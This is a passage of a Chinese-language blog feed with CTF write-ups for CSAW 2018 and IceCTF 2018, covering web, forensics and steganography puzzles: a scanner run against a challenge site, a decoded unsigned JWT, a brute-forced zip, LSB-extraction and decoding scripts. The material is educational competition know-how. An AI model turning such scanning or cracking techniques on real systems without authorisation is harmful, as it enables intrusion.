title="simple_recovery"></a>simple_recovery</h5><p><code>Simple Recovery Try to recover the data from these RAID 5 images!</code></p><p><a href="https://ctf.csaw.io/files/54ee1842ff27eb6bff1755f36f044b54/disk.img0.7z" target="_blank" rel="noopener">disk.img0.7z</a>，<a href="https://ctf.csaw.io/files/ebf1816483b27db5be622be0cc781224/disk.img1.7z" target="_blank" rel="noopener">disk.img1.7z</a></p><p>提供两个文件，<code>file</code>下</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537236481427.png" alt="1537236481427"></p><p>img文件，尝试一波挂载，竟然没效果，使用绝招<code>strings *| grep &quot;flag&quot;</code>，搜索出<code>flag</code>，一脸郁闷</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537238416590.png" alt="1537238416590"></p><h5 id="🐼-Rewind"><a href="#🐼-Rewind" class="headerlink" title="🐼 Rewind"></a>🐼 Rewind</h5><p><code>Sometimes you have to look back and replay what has been done right and wrong</code></p><p>解压之后，使用绝招<code>strings *| grep &quot;flag&quot;</code>，就那么几个，尝试下</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537441789426.png" alt="1537441789426"></p><p>最终答案：<code>flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}</code></p><h5 id="whyOS"><a href="#whyOS" class="headerlink" title="whyOS"></a>whyOS</h5><p><code>Have fun digging through that one. No device needed.</code></p><p><code>Note: the flag is not in flag{} format</code></p><p><code>HINT: the flag is literally a hex string. Put the hex string in the flag submission box</code></p><p><code>Update (09/15 11:45 AM EST) - Point of the challenge has been raised to 300 Update Sun 9:09 AM: its a hex string guys</code></p><p><a href="https://ctf.csaw.io/files/77ce62c32bbf0e685ebc0c5741b1d585/com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb" target="_blank" rel="noopener">com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb</a></p><p><a href="https://ctf.csaw.io/files/9c2e3d70941abc0b911990507ac73160/console.log" target="_blank" rel="noopener">console.log</a></p><p>给了两个文件</p><p>强行命令<code>strings * | grep &#39;Preferences&#39; | grep -E &#39;[0-9a-fA-F]{32,}&#39;</code>搜索</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537442382158.png" alt="1537442382158"></p><p>最终答案<code>ca3412b55940568c5b10a616fa7b855e</code></p><h5 id="mcgriddle"><a href="#mcgriddle" class="headerlink" title="mcgriddle"></a>mcgriddle</h5><p><code>All CTF players are squares</code></p><p><code>Edit (09/14 8:22 PM) - Uploaded new pcap file</code></p><p><code>Edit (09/15 12:10 AM) - Uploaded new pcap file</code></p><p><a href="https://ctf.csaw.io/files/86651aad7d1f26ee512b46327c5aa160/final.pcap" target="_blank" rel="noopener">final.pcap</a></p><p>这题流量分析后面单独开篇讲解，贼有意思的一道题目。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，&lt;code&gt;writeup&lt;/code&gt;后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Icectf2018 writeup</title>
    <link href="https://jianghuxia.github.io/2018/09/18/Icectf2018-writeup/"/>
    <id>https://jianghuxia.github.io/2018/09/18/Icectf2018-writeup/</id>
    <published>2018-09-18T09:40:45.000Z</published>
    <updated>2018-10-23T09:27:37.273Z</updated>
    
    <content type="html"><![CDATA[<p>这是场长知识的比赛，持续了<code>7</code>天，贼好玩，最大的收获:让我提起了对二进制方向学习的兴致。此篇，容我慢慢分析，后续慢慢更新，这个比赛是入门<code>pwn</code>的绝佳学习机会。<br><a id="more"></a> </p><h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="1-Toke-Relaunch"><a href="#1-Toke-Relaunch" class="headerlink" title="1.Toke Relaunch"></a>1.Toke Relaunch</h5><p><em>DESCRIPTION</em></p><p><code>We&#39;ve relaunched our famous website, Toke! Hopefully no one will hack it again and take it down like the last time.</code></p><p>额。。。打开网页，感觉好像挺难的</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281133227.png" alt="1536281133227"></p><p>扫下目录看看</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281217069.png" alt="1536281217069"></p><p>em~</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281246755.png" alt="1536281246755"></p><p>打开网页，得到flag</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281295124.png" alt="1536281295124"></p><p>最终答案：<code>IceCTF{what_are_these_robots_doing_here}</code></p><h5 id="2-Lights-out"><a href="#2-Lights-out" class="headerlink" title="2.Lights out!"></a>2.Lights out!</h5><p><strong>DESCRIPTION</strong></p><p><code>Help! We&#39;re scared of the dark!</code></p><p>这题虽然简单了点，但贼好玩。</p><p>打开页面，除了最上面那句话啥都是黑的。忙活半天，扫了半天，后面想想，估计是改前端吧。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372395900.png" alt="1536372395900"></p><p>开启调试模式，哎呦，发现<code>summary</code>区域是<code>none</code>状态</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372467928.png" alt="1536372467928"></p><p>随便改个玩玩，改成<code>red</code>吧</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372660917.png" alt="1536372660917"></p><p>(⊙o⊙)…，有秘密哦。然后直接再把整个页面的布局颜色直接改成蓝色，答案就出来啦</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372844041.png" alt="1536372844041"></p><p>当然也可以直接一个一个去改summary里面每个标签的颜色</p><p><img src="/2018/09/18/Icectf2018-writeup/1536373090648.png" alt="1536373090648"></p><p>最终答案：<code>IceCTF{styles_turned_the_lights}</code></p><h5 id="3-Friðfinnur"><a href="#3-Friðfinnur" class="headerlink" title="3.Friðfinnur"></a>3.Friðfinnur</h5><p><strong>DESCRIPTION</strong></p><p>Eve wants to make the hottest new website for job searching on the market! An avid PHP developer she decided to use the hottest new framework, Laravel! I don’t think she knew how to deploy websites at this scale however….</p><p>打开<a href="https://3rf0c2v1ztr0i6v-fridfinnur.labs.icec.tf/" target="_blank" rel="noopener">题目链接</a>，基于Laravel框架。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536459231158.png" alt="1536459231158"></p><p><code>awvs</code>扫一下，同时找了下近期<code>Laravel</code>有关的<a href="https://www.anquanke.com/vul/id/1251173" target="_blank" rel="noopener">cve</a>，awvs筛选出很多信息，仔细分析查看</p><p><img src="/2018/09/18/Icectf2018-writeup/1536459924650.png" alt="1536459924650"></p><p>(⊙o⊙)…，这样就找到flag了？？？在仔细看看相应的网页，好吧。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536459037563.png" alt="1536459037563"></p><p>最终答案：<code>IceCTF{you_found_debug}</code></p><h5 id="4-History-of-Computing"><a href="#4-History-of-Computing" class="headerlink" title="4.History of Computing"></a>4.History of Computing</h5><p>One of the authors of IceCTF made this page but I don’t think it’s very accurate. Can you take hack it before the IceCTF team gets sued?</p><p>这题也是水的没话说，不过，我还是做了很久，查看<code>token</code>就是了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token:   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9.</span><br></pre></td></tr></table></figure><p>然后<code>base64</code>解密，其中得到答案：</p><p><code>&quot;flag&quot;:&quot;IceCTF{hope you don&#39;t think this is a real flag}&quot;</code></p><h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="1-Modern-Picasso"><a href="#1-Modern-Picasso" class="headerlink" title="1.Modern Picasso"></a>1.Modern Picasso</h5><p><strong>DESCRIPTION</strong></p><p><code>Here&#39;s a rendition of some modern digital abstract art. Is it more than art though?</code></p><p>题目给了个<a href="https://static.icec.tf/picasso/picasso.gif" target="_blank" rel="noopener">picasso.gif</a>，分解出67张图片，感觉是拼图，使用工具<code>Firework</code>（使用其中的魔法棒工具，每次拖进去一张图片，都要按Delete一次）</p><p><img src="/2018/09/18/Icectf2018-writeup/1536395026633.png" alt="1536395026633"></p><p>得到最终答案：<code>IceCTF{wow_fast}</code></p><h5 id="2-Hard-Shells"><a href="#2-Hard-Shells" class="headerlink" title="2.Hard Shells"></a>2.Hard Shells</h5><p><strong>DESCRIPTION</strong></p><p><code>After a recent hack, a laptop was seized and subsequently analyzed. The victim of the hack? An innocent mexican restaurant. During the investigation they found this suspicous file. Can you find any evidence that the owner of this laptop is the culprit?</code></p><p>下载附件<code>hardshells</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536284769181.png" alt="1536284769181"></p><p><code>winhex</code>里瞧瞧，发现<code>PK</code>结构，改后缀名<code>.zip</code>，发现是加密的，尝试爆破</p><p><img src="/2018/09/18/Icectf2018-writeup/1536283602009.png" alt="1536283602009"></p><p>解压后，打开是个<code>d</code>文件</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284722432.png" alt="1536284722432"></p><p><code>file</code>一下<code>d: Minix filesystem, V1, 30 char names, 20 zones</code>，是个Minix的文件系统，可以执行挂载命令。ubuntu16.04下执行命令<code>mount -t minix d /home/jianghu/Documents -o loop</code>，挂载成功后有个dat，再次file，数据文件……</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284321328.png" alt="1536284321328"></p><p>还是取出来放<code>winhex</code>里瞧瞧吧</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284425359.png" alt="1536284425359"></p><p>很明显，<code>png</code>的头部，不过需要修正下：<code>U</code>-&gt;<code>N</code>，再加上后缀</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284553926.png" alt="1536284553926"></p><p>打开后</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284595374.png" alt="1536284595374"></p><p>最终答案：<code>IceCTF{look_away_i_am_hacking}</code></p><h5 id="3-Lost-in-the-Forest"><a href="#3-Lost-in-the-Forest" class="headerlink" title="3. Lost in the Forest"></a>3. Lost in the Forest</h5><p><strong>DESCRIPTION</strong></p><p>You’ve rooted a notable hacker’s system and you’re sure that he has hidden something juicy on there. Can you find his secret?</p><p>下载附件，给了个<code>fs.zip</code>，解压，好多文件目录，<code>tree</code>一下</p><p><img src="/2018/09/18/Icectf2018-writeup/1536286139874.png" alt="1536286139874"></p><p>额，还是去翻翻瞧瞧吧。在<code>fs\home\hkr\</code>目录下发现了好多东西</p><p><img src="/2018/09/18/Icectf2018-writeup/1536290790457.png" alt="1536290790457"></p><p>在<code>.bash_history</code>中可以看出黑客使用的历史命令，其中好像下载了什么东西</p><p><img src="/2018/09/18/Icectf2018-writeup/1536290912668.png" alt="1536290912668"></p><p>在往下翻翻有</p><p><img src="/2018/09/18/Icectf2018-writeup/1536291044444.png" alt="1536291044444"></p><p>哦~，看样子好像加密了什么东西，最后生成到了<code>hzpxbsklqvboyou</code>文件中</p><p>看看内容</p><p><img src="/2018/09/18/Icectf2018-writeup/1536291206600.png" alt="1536291206600"></p><p>这样的话，估计就是给了我们加密脚本和密文，让我们解密求出明文咯</p><p>打开刚刚的<code>.bash_history</code>中的<a href="https://gist.githubusercontent.com/Glitch-is/bc49ee73e5413f3081e5bcf5c1537e78/raw/c1f735f7eb36a20cb46b9841916d73017b5e46a3/eRkjLlksZp" target="_blank" rel="noopener">url</a>，以下是显示内容</p><p><img src="/2018/09/18/Icectf2018-writeup/1536285837841.png" alt="1536285837841"></p><p>具体脚本是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode((<span class="string">''</span>.join([chr(ord(s[x])+([<span class="number">5</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">-6</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">-3</span>,<span class="number">-5</span>,<span class="number">3</span>,<span class="number">-15</span>] * <span class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))])).encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)[::<span class="number">-1</span>]*<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(encode(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>嗯，好像有点难理解，其实挺简单的：<code>([5,-1,3,-3,2,15,-6,3,9,1,-3,-5,3,-15] * 3)</code>这一串是字典列表，假设密文中每个字符所在的位置为x，<code>[chr(ord(s[x])+([5,-1,3,-3,2,15,-6,3,9,1,-3,-5,3,-15] * 3)[x]) for x in range(len(s))]</code>那这一串，就是密文中每个字符的ascii对应数值加上字典列表中位置为x的数值之和对应的ascii字符。比如明文为<code>‘IceCTF{’</code>，对应的ascii数值分别为73、99、101、67、84、70、123，经过上面的方法计算后的结果就是78、98、104、64、86、85、117，对应的ascii字符组合起来为<code>‘Nbh@VUu’</code>。至于后面的，就是base64后加密结果*5次的字符串。至于此题解密过程，自己想想好啦。下面放出解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        <span class="comment">#print(s)</span></span><br><span class="line">        <span class="keyword">return</span> base64.b64encode((<span class="string">''</span>.join([chr(ord(s[x])+([<span class="number">5</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">-6</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">-3</span>,<span class="number">-5</span>,<span class="number">3</span>,<span class="number">-15</span>] * <span class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))])).encode(<span class="string">'utf-8'</span>))<span class="comment">#.decode('utf-8')[::-1]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        s=s[::<span class="number">-1</span>]</span><br><span class="line">        print(s)</span><br><span class="line">        s = base64.b64decode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        #ss='IceCTF&#123;'</span></span><br><span class="line"><span class="string">        for x in range(len(s)):</span></span><br><span class="line"><span class="string">            print(ord(s[x]))</span></span><br><span class="line"><span class="string">            print((ord(s[x]) - ([5, -1, 3, -3, 2, 15, -6, 3, 9, 1, -3, -5, 3, -15] * 3)[x]))</span></span><br><span class="line"><span class="string">            print(chr(ord(s[x]) - ([5, -1, 3, -3, 2, 15, -6, 3, 9, 1, -3, -5, 3, -15] * 3)[x]))</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        flag=<span class="string">''</span></span><br><span class="line">        flag+=(<span class="string">''</span>.join([chr(ord(s[x]) - ([<span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">-3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">-6</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">-3</span>, <span class="number">-5</span>, <span class="number">3</span>, <span class="number">-15</span>] * <span class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))]))</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#print(encode('haha.txt'))#测试文件haha.txt</span></span><br><span class="line">    print(decode(<span class="string">'hzpxbsklqvboyou'</span>))</span><br></pre></td></tr></table></figure><p>运行脚本，得到答案</p><p><img src="/2018/09/18/Icectf2018-writeup/1536290653712.png" alt="1536290653712"></p><p>最终答案：<code>IceCTF{good_ol_history_lesson}</code></p><h4 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h4><h5 id="1-Drumbone"><a href="#1-Drumbone" class="headerlink" title="1.Drumbone"></a>1.Drumbone</h5><p><strong>DESCRIPTION</strong></p><p><code>I joined a couple of hacking channels on IRC and I started recieving these strange messages. Someone sent me this image. Can you figure out if there&#39;s anything suspicous hidden in it?</code></p><p>题目给了个<code>drumbone.png</code>长这样</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294501244.png" alt="1536294501244"></p><p>StegSlove变色通道看看，发现<code>Blue plane 0</code> 有个类似二维码的东西</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294567990.png" alt="1536294567990"></p><p>搞鼓半天，没扫出来。后面保存为<code>Solved.bmp</code>拖到<strong>画图</strong>工具里面</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294644335.png" alt="1536294644335"></p><p>缩小成50%，然后保存，再拖到Fireworks，再缩小成33%</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294760288.png" alt="1536294760288"></p><p>识别二维码，扫出答案</p><p><img src="/2018/09/18/Icectf2018-writeup/1536294871007.png" alt="1536294871007"></p><p>最终答案：<code>IceCTF{Elliot_has_been_mapping_bits_all_day}</code></p><p>此题还有大佬解法为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'drumbone.png'</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line"></span><br><span class="line">(w,h) = img.size</span><br><span class="line">print(w,h)</span><br><span class="line"></span><br><span class="line">outimg_r = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line">outimg_g = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line">outimg_b = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line"></span><br><span class="line">pixels_r = outimg_r.load()</span><br><span class="line">pixels_g = outimg_g.load()</span><br><span class="line">pixels_b = outimg_b.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,w):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,h):</span><br><span class="line">    (r,g,b) = pixels[i,j]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> r&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_r[i,j] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_g[i,j] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_b[i,j] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">outimg_r.save(<span class="string">"outimg_r.png"</span>)</span><br><span class="line">outimg_g.save(<span class="string">"outimg_g.png"</span>)</span><br><span class="line">outimg_b.save(<span class="string">"outimg_b.png"</span>)</span><br></pre></td></tr></table></figure><p>其中得到的有张图片是这样的</p><p><img src="/2018/09/18/Icectf2018-writeup/1536899860339.png" alt="1536899860339"></p><p>然后，再修改下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'drumbone.png'</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line"></span><br><span class="line">(w,h) = img.size</span><br><span class="line">outimg_b = Image.new(<span class="string">'RGB'</span>, (w,h), <span class="string">"white"</span>)</span><br><span class="line">pixels_b = outimg_b.load()</span><br><span class="line"></span><br><span class="line">wout = <span class="number">-1</span></span><br><span class="line">hout = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,w,<span class="number">6</span>):</span><br><span class="line">  wout += <span class="number">1</span></span><br><span class="line">  hout = <span class="number">-1</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,h,<span class="number">6</span>):</span><br><span class="line">    hout+=<span class="number">1</span></span><br><span class="line">    (r,g,b) = pixels[i,j]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        pixels_b[wout,hout] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">outimg_b = outimg_b.resize((<span class="number">10</span>*w,<span class="number">10</span>*h))</span><br><span class="line">outimg_b.save(<span class="string">"outimg_d.png"</span>)</span><br></pre></td></tr></table></figure><p>直接生成出二维码</p><p><img src="/2018/09/18/Icectf2018-writeup/1536900301308.png" alt="1536900301308"></p><h5 id="2-Hot-or-Not（复现失败）"><a href="#2-Hot-or-Not（复现失败）" class="headerlink" title="2.Hot or Not（复现失败）"></a>2.Hot or Not（复现失败）</h5><p><strong>DESCRIPTION</strong></p><p>According to my friend Zuck, the first step on the path to great power is to rate the relative hotness of stuff… think Hot or Not.</p><p>给了一个非常之大的图片（估计是通过CV2将图片拼接起来的）</p><p><img src="/2018/09/18/Icectf2018-writeup/1536896085378.png" alt="1536896085378"></p><p>然后，不会，复现也失败，相关<a href="https://github.com/shiltemann/CTF-writeups-public/blob/master/IceCTF-2018/writeup.md#steganography-300-hot-or-not" target="_blank" rel="noopener">writeup</a>。</p><h5 id="3-Rabbit-Hole（复现失败）"><a href="#3-Rabbit-Hole（复现失败）" class="headerlink" title="3.Rabbit Hole（复现失败）"></a>3.Rabbit Hole（复现失败）</h5><p><strong>DESCRIPTION</strong></p><p>Here’s a picture of my favorite vegetable. I hope it doesn’t make you cry.</p><p><img src="/2018/09/18/Icectf2018-writeup/1536297622538.png" alt="1536297622538"></p><p>尝试使用工具<code>steghide</code>查看下信息</p><p><img src="/2018/09/18/Icectf2018-writeup/1536297958844.png" alt="1536297958844"></p><p>但是好像需要密码，想起题目是一张洋葱的图片，洋葱英译<code>onion</code>，有没可能这个是密码？执行命令<code>steghide --info rabbithole.jpg -p onion</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536298112927.png" alt="1536298112927"></p><p>果然有个<code>address.txt</code>，尝试提取出来，执行命令<code>steghide extract -sf rabbithole.jpg</code> </p><p><img src="/2018/09/18/Icectf2018-writeup/1536298163429.png" alt="1536298163429"></p><p>文件内容为<code>wsqxiyhn23zdi6ia</code>，然后百思不得其解，直到比赛结束，依旧无解。</p><p>后面的一系列踩坑操作，发现是这个意思因为图片是个洋葱，<code>onion</code>。上面那个<code>address.txt</code>中的内容即访问</p><p><code>http://wsqxiyhn23zdi6ia.onion</code>，但是前提是需要下载个<code>onion brower</code>的客户端。第二种方法是，直接访问 <code>https://onion.link/</code> ，然后搜索<code>wsqxiyhn23zdi6ia.onion</code>，你会找到<code>https://wsqxiyhn23zdi6ia.onion.link/</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536890641270.png" alt="1536890641270"></p><p>访问它，你会得到接下来需要解密的数据。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536890493178.png" alt="1536890493178"></p><p>嗯，是的就是这一坨。好吧，先复制下来吧，没思路，继续网上搜索。找啊找，找到外婆桥，你会找到个<a href="https://github.com/qntm/base65536" target="_blank" rel="noopener">github的项目</a>，好的，按照提示，先行下载。（歪果仁真会玩）</p><p>然后通过命令，<code>base65536</code>的转化得到一个<code>zip</code>文件，文件之中搜索<code>flag</code>格式<code>IceCTF</code>，执行命令<code>strings *| grep &quot;IceCTF&quot;</code>，即可得到答案。</p><p>以下是此题的坑点：</p><p>stegdetect安装时ubuntu下出现部分不兼容情况</p><p><a href="https://github.com/poizan42/stegdetect" target="_blank" rel="noopener">https://github.com/poizan42/stegdetect</a></p><p><img src="/2018/09/18/Icectf2018-writeup/1536325373114.png" alt="1536325373114"></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="1-Hello-World"><a href="#1-Hello-World" class="headerlink" title="1.Hello World!"></a>1.Hello World!</h5><p><strong>DESCRIPTION</strong></p><p>Welcome to the competition! To get you started we decided to give you your first flag. The flags all start with the “IceCTF” and have some secret message contained with in curly braces “{“ and “}”.</p><p>Within this platform, the challenges will be shown inside a frame to the right. For example purposes the download interface is shown on the right now. For static challenges you will need to click the large button in order to receive your challenge. For non static challenges, the lab itself will be shown on the right.</p><p>To submit the flag you can click the blue flag button in the bottom right hand corner.</p><p>Your flag is <code>IceCTF{this_is_a_flag}</code></p><h5 id="2-anticaptcha"><a href="#2-anticaptcha" class="headerlink" title="2.anticaptcha"></a>2.anticaptcha</h5><p><strong>DESCRIPTION</strong></p><p>Wow, this is a big captcha. Who has enough time to solve this? Seems like a lot of effort to me!</p><p>这题其实可以做出来的，脚本都写好了，回显总是一个错误</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 